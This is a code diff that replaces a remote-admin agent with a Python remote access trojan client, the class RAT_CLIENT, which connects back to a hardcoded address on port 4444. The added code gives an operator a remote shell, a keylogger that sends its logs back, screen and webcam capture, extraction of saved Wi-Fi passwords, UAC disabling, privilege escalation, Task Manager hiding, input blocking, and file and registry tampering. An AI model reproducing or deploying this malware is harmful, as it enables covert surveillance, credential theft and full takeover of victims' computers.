@@ -1,229 +1,610 @@
-#!/usr/bin/env python3
-# client.py
-# GGX Admin Agent (client)
-# Branding: "All rights reserved GGX 2025-2026"
+import random
+import socket, subprocess, os, platform
+from threading import Thread
+from PIL import Image
+from datetime import datetime
+from ctypes import cast, POINTER
+from comtypes import CLSCTX_ALL
+from winreg import *
+import shutil
+import glob
+import ctypes
+import sys
+import webbrowser
+import re
+import pyautogui
+import cv2
+import urllib.request
+import json
+from pynput.keyboard import Listener
+from pynput.mouse import Controller
+import time
+import keyboard
 
-import socket, time, json, os, sys, base64, threading, platform, subprocess
-from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
+user32 = ctypes.WinDLL('user32')
+kernel32 = ctypes.WinDLL('kernel32')
 
-# optional screenshot libs
-try:
-    import mss
-    from PIL import Image
-    PIL_AVAILABLE = True
-except Exception:
-    PIL_AVAILABLE = False
+HWND_BROADCAST = 65535
+WM_SYSCOMMAND = 274
+SC_MONITORPOWER = 61808
+GENERIC_READ = -2147483648
+GENERIC_WRITE = 1073741824
+FILE_SHARE_WRITE = 2
+FILE_SHARE_READ = 1
+FILE_SHARE_DELETE = 4
+CREATE_ALWAYS = 2
 
-# -------- CONFIG (edit BEFORE use) ----------
-SERVER_HOST = "127.0.0.1"   # server IP
-SERVER_PORT = 2345
-KEY = b'af031ea9fa98814bf79716597a8dceb19113b859897836200b686dd169925d22' * 32          # 32 byte key - REPLACE with secure value
-ADMIN_PASSWORD = "Saver23"
-RECONNECT_DELAY = 5
-STREAM_INTERVAL = 0.8
-# --------------------------------------------
+class RAT_CLIENT:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.curdir = os.getcwd()
 
-def send_msg(sock, payload: bytes):
-    ln = len(payload).to_bytes(4, 'big')
-    sock.sendall(ln + payload)
+    def build_connection(self):
+        global s
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((self.host, self.port))
+        sending = socket.gethostbyname(socket.gethostname())
+        s.send(sending.encode())
+    
+    def errorsend(self):
+        output = bytearray("no output", encoding='utf8')
+        for i in range(len(output)):
+            output[i] ^= 0x41
+        s.send(output)
+    
+    def keylogger(self):
+        def on_press(key):
+            if klgr == True:
+                with open('keylogs.txt', 'a') as f:
+                    f.write(f'{key}')
+                    f.close()
 
-def recv_msg(sock):
-    header = recv_all(sock, 4)
-    if not header:
-        return None
-    ln = int.from_bytes(header, 'big')
-    return recv_all(sock, ln)
-
-def recv_all(sock, n):
-    data = b''
-    while len(data) < n:
-        packet = sock.recv(n - len(data))
-        if not packet:
-            return None
-        data += packet
-    return data
-
-def encrypt(plaintext: bytes) -> bytes:
-    nonce = get_random_bytes(12)
-    cipher = AES.new(KEY, AES.MODE_GCM, nonce=nonce)
-    ct, tag = cipher.encrypt_and_digest(plaintext)
-    return nonce + tag + ct
-
-def decrypt(payload: bytes) -> bytes:
-    if len(payload) < 28:
-        raise ValueError("Invalid payload")
-    nonce = payload[:12]; tag = payload[12:28]; ct = payload[28:]
-    cipher = AES.new(KEY, AES.MODE_GCM, nonce=nonce)
-    return cipher.decrypt_and_verify(ct, tag)
-
-def send_encrypted(sock, data: bytes):
-    send_msg(sock, encrypt(data))
-
-def recv_encrypted(sock):
-    raw = recv_msg(sock)
-    if raw is None:
-        return None
-    try:
-        return decrypt(raw)
-    except Exception:
-        return None
-
-# system info
-def system_info():
-    try:
-        import psutil
-    except Exception:
-        return {"error": "psutil missing"}
-    info = {
-        "hostname": platform.node(),
-        "platform": platform.platform(),
-        "python": platform.python_version(),
-    }
-    try:
-        cpu = psutil.cpu_percent(interval=0.1)
-        mem = psutil.virtual_memory()._asdict()
-        disk = {p.mountpoint: psutil.disk_usage(p.mountpoint)._asdict() for p in psutil.disk_partitions()}
-        info.update({"cpu_percent": cpu, "mem": mem, "disk": disk})
-    except Exception as e:
-        info["sys_error"] = str(e)
-    return info
-
-# screenshot capture
-def capture_screenshot_bytes(quality=60, scale=0.6):
-    if not PIL_AVAILABLE:
-        raise RuntimeError("Screenshot libs missing")
-    with mss.mss() as s:
-        monitor = s.monitors[1]
-        img = s.grab(monitor)
-        pil = Image.frombytes("RGB", img.size, img.rgb)
-        if scale != 1.0:
-            new_size = (int(pil.width * scale), int(pil.height * scale))
-            pil = pil.resize(new_size, Image.LANCZOS)
-        from io import BytesIO
-        buf = BytesIO()
-        pil.save(buf, format="JPEG", quality=quality)
-        return buf.getvalue()
-
-stream_flag = threading.Event()
-
-def handle_command(cmd_obj, sock):
-    cmd = cmd_obj.get("cmd")
-    args = cmd_obj.get("args", [])
-    if cmd == "sysinfo":
-        return json.dumps(system_info()).encode()
-    if cmd == "screenshot":
-        try:
-            data = capture_screenshot_bytes()
-            return b"IMG:" + base64.b64encode(data)
-        except Exception as e:
-            return f"ERROR: screenshot failed: {e}".encode()
-    if cmd == "start_stream":
-        if not PIL_AVAILABLE:
-            return b"ERROR: streaming not available"
-        if stream_flag.is_set():
-            return b"STREAM_ALREADY"
-        stream_flag.set()
-        t = threading.Thread(target=stream_loop, args=(sock,), daemon=True)
-        t.start()
-        return b"STREAM_STARTED"
-    if cmd == "stop_stream":
-        stream_flag.clear()
-        return b"STREAM_STOPPED"
-    if cmd == "exec":
-        if not args:
-            return b"ERROR: missing command"
-        try:
-            out = subprocess.check_output(" ".join(args), shell=True, stderr=subprocess.STDOUT, timeout=60)
-            return out
-        except subprocess.CalledProcessError as e:
-            return e.output + f"\n(Exit {e.returncode})".encode()
-        except Exception as e:
-            return f"ERROR: {e}".encode()
-    if cmd == "quit":
-        pw = cmd_obj.get("pw", "")
-        if pw == ADMIN_PASSWORD:
-            send_encrypted(sock, b"Agent shutting down (authorized).")
-            sock.close()
-            sys.exit(0)
-        return b"ERROR: invalid admin password"
-    if cmd == "listdir":
-        path = args[0] if args else "."
-        try:
-            entries = os.listdir(path)
-            return json.dumps({"path": path, "entries": entries}).encode()
-        except Exception as e:
-            return f"ERROR: {e}".encode()
-    if cmd == "readfile":
-        if not args:
-            return b"ERROR: missing path"
-        path = args[0]
-        try:
-            with open(path, "rb") as f:
-                data = f.read()
-            return b"FILE:" + base64.b64encode(data)
-        except Exception as e:
-            return f"ERROR: {e}".encode()
-    if cmd == "upload":
-        payload = recv_encrypted(sock)
-        if payload is None:
-            return b"ERROR: no upload payload"
-        try:
-            j = json.loads(payload.decode())
-            p = j["path"]; b64 = j["base64"]
-            with open(p, "wb") as f:
-                f.write(base64.b64decode(b64))
-            return f"UPLOAD_OK:{p}".encode()
-        except Exception as e:
-            return f"ERROR: {e}".encode()
-    return b"ERROR: unknown command"
-
-def stream_loop(sock):
-    try:
-        while stream_flag.is_set():
-            try:
-                img = capture_screenshot_bytes(quality=45, scale=0.45)
-            except Exception:
-                stream_flag.clear()
-                break
-            payload = b"IMG:" + base64.b64encode(img)
-            try:
-                send_encrypted(sock, payload)
-            except Exception:
-                stream_flag.clear()
-                break
-            time.sleep(STREAM_INTERVAL)
-    finally:
-        stream_flag.clear()
-
-def run_client_loop():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(20)
-            s.connect((SERVER_HOST, SERVER_PORT))
-            s.settimeout(None)
-            hello = {"type":"hello", "hostname": platform.node(), "platform": platform.platform()}
-            send_encrypted(s, json.dumps(hello).encode())
-            while True:
-                data = recv_encrypted(s)
-                if data is None:
-                    break
+        with Listener(on_press=on_press) as listener:
+            listener.join()
+    
+    def block_task_manager(self):
+        if ctypes.windll.shell32.IsUserAnAdmin() == 1:
+            while (1):
+                if block == True:
+                    hwnd = user32.FindWindowW(0, "Task Manager")
+                    user32.ShowWindow(hwnd, 0)
+                    ctypes.windll.kernel32.Sleep(500)
+    
+    def disable_all(self):
+        while True:
+            user32.BlockInput(True)
+    
+    def disable_mouse(self):
+        mouse = Controller()
+        t_end = time.time() + 3600*24*11
+        while time.time() < t_end and mousedbl == True:
+            mouse.position = (0, 0)
+    
+    def disable_keyboard(self):
+        for i in range(150):
+            if kbrd == True:
+                keyboard.block_key(i)
+        time.sleep(999999)
+    
+    def execute(self):
+        while True:
+            command = s.recv(1024).decode()
+            
+            if command == 'shell':
+                while 1:
+                    command = s.recv(1024).decode()
+                    if command.lower() == 'exit' :
+                        break
+                    if command == 'cd':
+                        os.chdir(command[3:].decode('utf-8'))
+                        dir = os.getcwd()
+                        dir1 = str(dir)
+                        s.send(dir1.encode())
+                    output = subprocess.getoutput(command)
+                    s.send(output.encode())
+                    if not output:
+                        self.errorsend()
+            
+            elif command == 'screenshare':
                 try:
-                    cmd_obj = json.loads(data.decode())
-                except Exception:
-                    send_encrypted(s, b"ERROR: invalid command format")
-                    continue
-                resp = handle_command(cmd_obj, s)
-                if isinstance(resp, str):
-                    resp = resp.encode()
-                send_encrypted(s, resp)
-        except Exception:
-            try:
-                s.close()
-            except Exception:
+                    from vidstream import ScreenShareClient
+                    screen = ScreenShareClient(self.host, 8080)
+                    screen.start_stream()
+                except:
+                    s.send("Impossible to get screen")
+            
+            elif command == 'webcam':
+                try:
+                    from vidstream import CameraClient
+                    cam = CameraClient(self.host, 8080)
+                    cam.start_stream()
+                except:
+                    s.send("Impossible to get webcam")
+            
+            elif command == 'breakstream':
                 pass
-            time.sleep(RECONNECT_DELAY)
 
-if __name__ == "__main__":
-    run_client_loop()
+            elif command == 'list':
+                pass
+
+            elif command == 'geolocate':
+                with urllib.request.urlopen("https://geolocation-db.com/json") as url:
+                    data = json.loads(url.read().decode())
+                    link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
+                s.send(link.encode())
+            
+            elif command == 'setvalue':
+                const = s.recv(1024).decode()
+                root = s.recv(1024).decode()
+                key2 = s.recv(1024).decode()
+                value = s.recv(1024).decode()
+                try:
+                    if const == 'HKEY_CURRENT_USER':
+                        key = OpenKey(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
+                        SetValueEx(key, key2, 0, REG_SZ, str(value))
+                        CloseKey(key)
+                    if const == 'HKEY_CLASSES_ROOT':
+                        key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
+                        SetValueEx(key, key2, 0, REG_SZ, str(value))
+                        CloseKey(key)
+                    if const == 'HKEY_LOCAL_MACHINE':
+                        key = OpenKey(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
+                        SetValueEx(key, key2, 0, REG_SZ, str(value))
+                        CloseKey(key)
+                    if const == 'HKEY_USERS':
+                        key = OpenKey(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
+                        SetValueEx(key, key2, 0, REG_SZ, str(value))
+                        CloseKey(key)
+                    if const == 'HKEY_CLASSES_ROOT':
+                        key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
+                        SetValueEx(key, key2, 0, REG_SZ, str(value))
+                        CloseKey(key)
+                    if const == 'HKEY_CURRENT_CONFIG':
+                        key = OpenKey(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
+                        SetValueEx(key, key2, 0, REG_SZ, str(value))
+                        CloseKey(key)
+                    s.send("Value is set".encode())
+                except:
+                    s.send("Impossible to create key".encode())
+            
+            elif command == 'delkey':
+                const = s.recv(1024).decode()
+                root = s.recv(1024).decode()
+                try:
+                    if const == 'HKEY_CURRENT_USER':
+                        DeleteKeyEx(HKEY_CURRENT_USER, root, KEY_ALL_ACCESS, 0)
+                    if const == 'HKEY_LOCAL_MACHINE':
+                        DeleteKeyEx(HKEY_LOCAL_MACHINE, root, KEY_ALL_ACCESS, 0)
+                    if const == 'HKEY_USERS':
+                        DeleteKeyEx(HKEY_USERS, root, KEY_ALL_ACCESS, 0)
+                    if const == 'HKEY_CLASSES_ROOT':
+                        DeleteKeyEx(HKEY_CLASSES_ROOT, root, KEY_ALL_ACCESS, 0)
+                    if const == 'HKEY_CURRENT_CONFIG':
+                        DeleteKeyEx(HKEY_CURRENT_CONFIG, root, KEY_ALL_ACCESS, 0)
+                    s.send("Key is deleted".encode())
+                except:
+                    s.send("Impossible to delete key".encode())
+            
+            elif command == 'createkey':
+                const = s.recv(1024).decode()
+                root = s.recv(1024).decode()
+                try:
+                    if const == 'HKEY_CURRENT_USER':
+                        CreateKeyEx(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
+                    if const == 'HKEY_LOCAL_MACHINE':
+                        CreateKeyEx(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
+                    if const == 'HKEY_USERS':
+                        CreateKeyEx(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
+                    if const == 'HKEY_CLASSES_ROOT':
+                        CreateKeyEx(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
+                    if const == 'HKEY_CURRENT_CONFIG':
+                        CreateKeyEx(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
+                    s.send("Key is created".encode())
+                except:
+                    s.send("Impossible to create key".encode())
+            
+            elif command == 'volumeup':
+                try:
+                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+                    devices = AudioUtilities.GetSpeakers()
+                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+                    volume = cast(interface, POINTER(IAudioEndpointVolume))
+                    if volume.GetMute() == 1:
+                        volume.SetMute(0, None)
+                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
+                    s.send("Volume is increased to 100%".encode())
+                except:
+                    s.send("Module is not founded".encode())
+            
+            elif command == 'volumedown':
+                try:
+                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+                    devices = AudioUtilities.GetSpeakers()
+                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+                    volume = cast(interface, POINTER(IAudioEndpointVolume))
+                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
+                    s.send("Volume is decreased to 0%".encode())
+                except:
+                    s.send("Module is not founded".encode())
+            
+            elif command == 'setwallpaper':
+                pic = s.recv(6000).decode()
+                try:
+                    ctypes.windll.user32.SystemParametersInfoW(20, 0, pic, 0)
+                    s.send(f'{pic} is set as a wallpaper'.encode())
+                except:
+                    s.send("No such file")
+
+            elif command == 'usbdrivers':
+                p = subprocess.check_output(["powershell.exe", "Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }"], encoding='utf-8')
+                s.send(p.encode())
+            
+            elif command == 'monitors':
+                p = subprocess.check_output(["powershell.exe", "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"], encoding='utf-8')
+                s.send(p.encode())
+
+            elif command == 'sysinfo':
+                sysinfo = str(f'''
+System: {platform.platform()} {platform.win32_edition()}
+Architecture: {platform.architecture()}
+Name of Computer: {platform.node()}
+Processor: {platform.processor()}
+Python: {platform.python_version()}
+Java: {platform.java_ver()}
+User: {os.getlogin()}
+                ''')
+                s.send(sysinfo.encode())
+            
+            elif command == 'reboot':
+                os.system("shutdown /r /t 1")
+                s.send(f'{socket.gethostbyname(socket.gethostname())} is being rebooted'.encode())
+            
+            elif command[:7] == 'writein':
+                pyautogui.write(command.split(" ")[1])
+                s.send(f'{command.split(" ")[1]} is written'.encode())
+            
+            elif command[:8] == 'readfile':
+                try:
+                    f = open(command[9:], 'r')
+                    data = f.read()
+                    if not data: s.send("No data".encode())
+                    f.close()
+                    s.send(data.encode())
+                except:
+                    s.send("No such file in directory".encode())
+            
+            elif command[:7] == 'abspath':
+                try:
+                    path = os.path.abspath(command[8:])
+                    s.send(path.encode())
+                except:
+                    s.send("No such file in directory".encode())
+
+            elif command == 'pwd':
+                curdir = str(os.getcwd())
+                s.send(curdir.encode())
+            
+            elif command == 'ipconfig':
+                output = subprocess.check_output('ipconfig', encoding='oem')
+                s.send(output.encode())
+            
+            elif command == 'portscan':
+                output = subprocess.check_output('netstat -an', encoding='oem')
+                s.send(output.encode())
+            
+            elif command == 'tasklist':
+                output = subprocess.check_output('tasklist', encoding='oem')
+                s.send(output.encode())
+
+            elif command == 'profiles':
+                output = subprocess.check_output('netsh wlan show profiles', encoding='oem')
+                s.send(output.encode())
+            
+            elif command == 'profilepswd':
+                profile = s.recv(6000)
+                profile = profile.decode()
+                try:
+                    output = subprocess.check_output(f'netsh wlan show profile {profile} key=clear', encoding='oem')
+                    s.send(output.encode())
+                except:
+                    self.errorsend()
+            
+            elif command == 'systeminfo':
+                output = subprocess.check_output(f'systeminfo', encoding='oem')
+                s.send(output.encode())
+            
+            elif command == 'sendmessage':
+                text = s.recv(6000).decode()
+                title = s.recv(6000).decode()
+                s.send('MessageBox has appeared'.encode())
+                user32.MessageBoxW(0, text, title, 0x00000000 | 0x00000040)
+            
+            elif command.startswith("disable") and command.endswith("--all"):
+                Thread(target=self.disable_all, daemon=True).start()
+                s.send("Keyboard and mouse are disabled".encode())
+            
+            elif command.startswith("disable") and command.endswith("--keyboard"):
+                global kbrd
+                kbrd = True
+                Thread(target=self.disable_keyboard, daemon=True).start()
+                s.send("Keyboard is disabled".encode())
+            
+            elif command.startswith("disable") and command.endswith("--mouse"):
+                global mousedbl
+                mousedbl = True
+                Thread(target=self.disable_mouse, daemon=True).start()
+                s.send("Mouse is disabled".encode())
+            
+            elif command == 'disableUAC':
+                os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
+            
+            elif command.startswith("enable") and command.endswith("--keyboard"):
+                kbrd = False
+                s.send("Mouse and keyboard are unblocked".encode())
+            
+            elif command.startswith("enable") and command.endswith("--mouse"):
+                mousedbl = False
+                s.send("Mouse is enabled".encode())
+
+            elif command.startswith("enable") and command.endswith("--all"):
+                user32.BlockInput(False)
+                s.send("Keyboard and mouse are enabled".encode())
+                
+            elif command == 'turnoffmon':
+                s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned off".encode())
+                user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
+            
+            elif command == 'turnonmon':
+                s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned on".encode())
+                user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
+            
+            elif command == 'extendrights':
+                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+                sending = f"{socket.gethostbyname(socket.gethostname())}'s rights were escalated"
+                s.send(sending.encode())
+            
+            elif command == 'isuseradmin':
+                if ctypes.windll.shell32.IsUserAnAdmin() == 1:
+                    sending = f'{socket.gethostbyname(socket.gethostname())} is admin'
+                    s.send(sending.encode())
+                else:
+                    sending = f'{socket.gethostbyname(socket.gethostname())} is not admin'
+                    s.send(sending.encode())
+
+            elif command == 'keyscan_start':
+                global klgr
+                klgr = True
+                kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ, 
+                FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
+                None, CREATE_ALWAYS , 0, 0)
+                Thread(target=self.keylogger, daemon=True).start()
+                s.send("Keylogger is started".encode())
+            
+            elif command == 'send_logs':
+                try:
+                    f = open("keylogs.txt", 'r')
+                    lines = f.readlines()
+                    f.close()
+                    s.send(str(lines).encode())
+                    os.remove('keylogs.txt')
+                except:
+                    self.errorsend()
+            
+            elif command == 'stop_keylogger':
+                klgr = False
+                s.send("The session of keylogger is terminated".encode())
+            
+            elif command == 'cpu_cores':
+                output = os.cpu_count()
+                s.send(str(output).encode())
+
+            elif command[:7] == 'delfile':
+                try:
+                    os.remove(command[8:])
+                    s.send(f'{command[8:]} was successfully deleted'.encode())
+                except:
+                    self.errorsend()
+            
+            elif command[:8] == 'editfile':
+                try:
+                    with open(command.split(" ")[1], 'a') as f:
+                        f.write(command.split(" ")[2])
+                        f.close()
+                    sending = f'{command.split(" ")[2]} was written to {command.split(" ")[1]}'
+                    s.send(sending.encode())
+                except:
+                    self.errorsend()
+            
+            elif command[:2] == 'cp':
+                try: 
+                    shutil.copyfile(command.split(" ")[1], command.split(" ")[2])
+                    s.send(f'{command.split(" ")[1]} was copied to {command.split(" ")[2]}'.encode())
+                except:
+                    self.errorsend()
+            
+            elif command[:2] == 'mv':
+                try:
+                    shutil.move(command.split(" ")[1], command.split(" ")[2])
+                    s.send(f'File was moved from {command.split(" ")[1]} to {command.split(" ")[2]}'.encode())
+                except:
+                    self.errorsend()
+            
+            elif command[:2] == 'cd':
+                command = command[3:]
+                try:
+                    os.chdir(command)
+                    curdir = str(os.getcwd())
+                    s.send(curdir.encode())
+                except:
+                    s.send("No such directory".encode())
+            
+            elif command == 'cd ..':
+                os.chdir('..')
+                curdir = str(os.getcwd())
+                s.send(curdir.encode())
+            
+            elif command == 'dir':
+                try:
+                    output = subprocess.check_output(["dir"], shell=True)
+                    output = output.decode('utf8', errors='ignore')
+                    s.send(output.encode())
+                except:
+                    self.errorsend()
+            
+            elif command[1:2] == ':':
+                try:
+                    os.chdir(command)
+                    curdir = str(os.getcwd())
+                    s.send(curdir.encode())
+                except: 
+                    s.send("No such directory".encode())
+            
+            elif command[:10] == 'createfile':
+                kernel32.CreateFileW(command[11:], GENERIC_WRITE & GENERIC_READ, 
+                FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
+                None, CREATE_ALWAYS , 0, 0)
+                s.send(f'{command[11:]} was created'.encode())
+
+            elif command[:10] == 'searchfile':
+                for x in glob.glob(command.split(" ")[2]+"\\**\*", recursive=True):
+                    if x.endswith(command.split(" ")[1]):
+                        path = os.path.abspath(x)
+                        s.send(str(path).encode())
+                    else:
+                        continue
+            
+            elif command == 'curpid':
+                pid = os.getpid()
+                s.send(str(pid).encode())
+            
+            elif command == 'drivers':
+                drives = []
+                bitmask = kernel32.GetLogicalDrives()
+                letter = ord('A')
+                while bitmask > 0:
+                    if bitmask & 1:
+                        drives.append(chr(letter) + ':\\')
+                    bitmask >>= 1
+                    letter += 1
+                s.send(str(drives).encode())
+            
+            elif command[:4] == 'kill':
+                try:
+                    os.system(f'TASKKILL /F /im {command[5:]}')
+                    s.send(f'{command[5:]} was terminated'.encode())
+                except:
+                    self.errorsend()
+            
+            elif command == 'shutdown':
+                os.system('shutdown /s /t 1')
+                sending = f"{socket.gethostbyname(socket.gethostname())} was shutdown"
+                s.send()
+            
+            elif command == 'disabletaskmgr':
+                global block
+                block = True
+                Thread(target=self.block_task_manager, daemon=True).start()
+                s.send("Task Manager is disabled".encode())
+            
+            elif command == 'enabletaskmgr':
+                block = False
+                s.send("Task Manager is enabled".encode())
+            
+            elif command == 'localtime':
+                now = datetime.now()
+                current_time = now.strftime("%H:%M:%S")
+                s.send(str(current_time).encode())
+            
+            elif command[:9] == 'startfile':
+                try:
+                    s.send(f'{command[10:]} was started'.encode())
+                    os.startfile(command[10:])
+                except:
+                    self.errorsend()
+
+            elif command[:8] == 'download':
+                try:
+                    file = open(command.split(" ")[1], 'rb')
+                    data = file.read()
+                    s.send(data)
+                except:
+                    self.errorsend()
+
+            elif command == 'upload':
+                filename = s.recv(6000)
+                newfile = open(filename, 'wb')
+                data = s.recv(6000)
+                newfile.write(data)
+                newfile.close()
+            
+            elif command[:5] == 'mkdir':
+                try:
+                    os.mkdir(command[6:])
+                    s.send(f'Directory {command[6:]} was created'.encode())
+                except:
+                    self.errorsend()
+            
+            elif command[:5] == 'rmdir':
+                try:
+                    shutil.rmtree(command[6:])
+                    s.send(f'Directory {command[6:]} was removed'.encode())
+                except:
+                    self.errorsend()
+            
+            elif command == 'browser':
+                quiery = s.recv(6000)
+                quiery = quiery.decode()
+                try:
+                    if re.search(r'\.', quiery):
+                        webbrowser.open_new_tab('https://' + quiery)
+                    elif re.search(r'\ ', quiery):
+                        webbrowser.open_new_tab('https://yandex.ru/search/?text='+quiery)
+                    else:
+                        webbrowser.open_new_tab('https://yandex.ru/search/?text=' + quiery)
+                    s.send("The tab is opened".encode())
+                except:
+                    self.errorsend()
+            
+            elif command == 'screenshot':
+                try:
+                    file = f'{random.randint(111111, 444444)}.png'
+                    file2 = f'{random.randint(555555, 999999)}.png'
+                    pyautogui.screenshot(file)
+                    image = Image.open(file)
+                    new_image = image.resize((1920, 1080))
+                    new_image.save(file2)
+                    file = open(file2, 'rb')
+                    data = file.read()
+                    s.send(data)
+                except:
+                    self.errorsend()
+            
+            elif command == 'webcam_snap':
+                try:
+                    file = f'{random.randint(111111, 444444)}.png'
+                    file2 = f'{random.randint(555555, 999999)}.png'
+                    global return_value, i
+                    cam = cv2.VideoCapture(0)
+                    for i in range(1):
+                        return_value, image = cam.read()
+                        filename = cv2.imwrite(f'{file}', image)
+                    del(cam)
+                    image = Image.open(file)
+                    new_image = image.resize((1920, 1080))
+                    new_image.save(file2)
+                    file = open(file2, 'rb')
+                    data = file.read()
+                    s.send(data)
+                except:
+                    self.errorsend()
+
+            elif command == 'exit':
+                s.send(b"exit")
+                break
+
+rat = RAT_CLIENT('10.40.2.159', 4444)
+
+if __name__ == '__main__':
+    rat.build_connection()
+    rat.execute()
